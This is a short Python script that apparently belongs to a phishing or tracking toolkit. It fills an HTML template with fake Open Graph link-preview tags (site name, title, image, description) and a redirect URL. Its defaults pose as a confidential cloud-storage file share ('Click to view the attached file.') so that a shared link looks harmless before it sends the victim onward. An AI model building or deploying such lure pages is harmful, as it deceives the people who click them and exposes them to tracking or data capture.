#!/usr/bin/env python3

import os
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

redirect = os.getenv('REDIRECT')
sitename = os.getenv('SITENAME')
title = os.getenv('TITLE')
imageUrl = os.getenv('IMAGE')
desc = os.getenv("DESC")

old = 'n'
config_exists = os.path.exists('template/custom_og_tags/index.html')
if config_exists and not redirect and not sitename and not title and not imageUrl and not desc:
    try:
        old = input(G + '[+]' + C + ' Do you want to reuse previous configs? (Y/N) : ' + W)
    except Exception:
        old = 'n'

if old.lower() != 'y':
    if not redirect:
        redirect = input(G + '[+]' + C + ' Enter Target URL (YouTube,Blog etc) : ' + W) or 'https://google.com'
    utils.print(f'{G}[+] {C}Target URL :{W} ' + redirect)
    
    if not sitename:
        sitename = input(G + '[+]' + C + ' Site Name: ' + W) or 'Cloud Storage'
    utils.print(f'{G}[+] {C}Site Name :{W} ' + sitename)
    
    if not title:
        title = input(G + '[+]' + C + ' Title : ' + W) or 'Confidential Document Share'
    utils.print(f'{G}[+] {C}Title :{W} ' + title)
    
    if not imageUrl:
        imageUrl = input(G + '[+]' + C + ' Image URL: ' + W) or 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600'
    utils.print(f'{G}[+] {C}Image :{W} ' + imageUrl)
    
    if not desc:
        desc = input(G + '[+]' + C + ' Description: ' + W) or 'Click to view the attached file.'
    utils.print(f'{G}[+] {C}Description :{W} ' + desc)

    with open('template/custom_og_tags/index_temp.html', 'r') as index_temp:
        code = index_temp.read()
        if os.getenv("DEBUG_HTTP"):
            code = code.replace('window.location = "https:" + restOfUrl;', '')
        code = code.replace('$SITE_NAME$', sitename)
        code = code.replace('REDIRECT_URL', redirect)
        code = code.replace('$TITLE$', title)
        code = code.replace('$IMG_URL$', imageUrl)
        code = code.replace('$DESCRIPTION$', desc)

    with open('template/custom_og_tags/index.html', 'w') as new_index:
        new_index.write(code)
